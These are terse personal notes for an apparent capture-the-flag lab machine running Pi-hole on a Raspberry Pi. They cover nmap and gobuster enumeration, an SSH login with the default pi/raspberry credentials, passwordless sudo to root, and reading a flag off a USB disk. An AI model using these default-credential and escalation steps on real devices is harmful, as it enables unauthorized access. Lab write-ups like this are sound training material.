10.10.10.48

## Enumeration
sudo nmap -sV -sC -O -v -Pn 10.10.10.48
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp open  domain  dnsmasq 2.76
80/tcp open  http    lighttpd 1.4.35

sudo gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirb/common.txt
/admin

X-Pi-hole

SSH default creds
pi 
raspberry

ssh pi@10.10.10.48

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

sudo su to root

find root flag

lsblk
* sdb disk /media/usbstick

cd /media/usb+stick

strings /dev/sdb
